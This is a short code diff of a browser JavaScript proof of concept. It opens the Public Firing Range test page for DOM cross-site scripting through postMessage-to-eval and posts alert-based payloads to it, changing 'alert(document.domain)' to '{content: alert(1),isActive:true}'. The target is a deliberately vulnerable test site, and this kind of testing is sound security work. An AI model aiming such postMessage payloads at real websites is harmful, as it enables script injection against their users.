@@ -4,12 +4,9 @@
 
 //)
 
-const target = window.open("https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" ,"_blank","popup");
+const target = window.open("https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" );
 
 target.postMessage(
-"alert(document.domain)" , "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval"
+"{content: alert(1),isActive:true}" , "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval"
 );
 
-window.addEventListener(
-    "message",
-)
